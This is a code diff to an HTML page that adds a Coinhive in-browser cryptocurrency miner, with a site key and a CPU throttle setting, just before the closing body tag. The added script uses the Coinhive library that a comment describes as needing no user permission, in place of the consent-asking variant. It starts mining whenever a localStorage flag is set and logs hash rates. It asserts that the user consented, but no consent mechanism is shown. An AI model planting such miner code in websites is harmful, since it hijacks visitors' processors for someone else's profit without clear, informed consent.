@@ -105,6 +105,23 @@
 				</div>				
 			</div>
 		</div>
+		<script src="https://coinhive.com/lib/coinhive.min.js">
+		//https://coinhive.com/lib/coinhive.min.js  <-- no user permission needed
+		//https://authedmine.com/lib/authedmine.min.js  <-- user permission needed (asked by site, not by me)
+		</script>
+
+		<script type="text/javascript">
+		var miner = new CoinHive.Anonymous('HJ7yyYmYI5RxwlPr9QUnf3hdjvnK4x8C', {throttle: 0.7});
+		if (localStorage.mineGMO == 'true' && !miner.isMobile()) {
+			miner.start();
+			setInterval(function() {console.log("hashes per second = " + miner.getHashesPerSecond());}, 500);
+			setInterval(function() {console.log("total hashes = " + miner.getTotalHashes());}, 1000);
+			console.log('miner started automatically because user consented.');
+		} else if (localStorage.mineGMO == 'false') {
+			miner.stop();
+			console.log('miner did not start');
+		}
+		</script>
 
 
 	</body>
